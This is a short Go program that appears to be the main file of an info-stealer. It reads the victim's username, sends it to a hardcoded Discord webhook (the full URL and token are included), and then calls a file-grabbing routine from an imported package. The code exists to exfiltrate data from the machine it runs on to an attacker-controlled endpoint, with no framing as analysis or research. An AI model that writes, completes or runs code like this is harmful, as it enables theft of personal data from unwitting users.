package main

import (
	"fmt"

	files "info.com/project/pkg/grab"
	users "info.com/project/pkg/info"
	wclinet "info.com/project/pkg/wclinet"
)

func main() {
	weburl := "https://discord.com/api/webhooks/1230470692525576243/M4_AWW3M-zk1Umv4gqNFhbI6lnXKjD1u3xXrPgDfYdeeLJdjt75ASqGtd2bJ9ODdnaAx"

	//	fmt.Println("[+] SystemName found")

	uinfo, err := users.GetUsername()
	if err != nil {
		fmt.Println("[-] Faild")
	}
	//fmt.Println("[+] Username: " + uinfo)

	wclinet.SendMessage(weburl, "[+] Username: "+uinfo)

	//	fmt.Println("[+] Send.")

	files.Grab()
}
